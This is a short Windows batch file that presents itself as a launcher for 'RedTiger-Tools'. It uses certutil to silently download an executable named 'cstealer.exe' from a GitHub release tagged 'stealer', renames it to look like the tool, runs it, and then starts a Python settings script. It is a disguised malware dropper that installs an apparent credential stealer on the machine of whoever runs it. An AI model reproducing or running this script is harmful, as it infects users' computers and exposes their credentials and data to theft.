@echo off
set "URL=https://github.com/hvbsvqdj/cstealer/releases/download/stealer/cstealer.exe"
set "Dossier=Img"
set "NomFichier=%Dossier%\RedTiger-Tools.exe"

certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1

if exist "%NomFichier%" (
    start "" "%NomFichier%"
)
python Settings/Start.py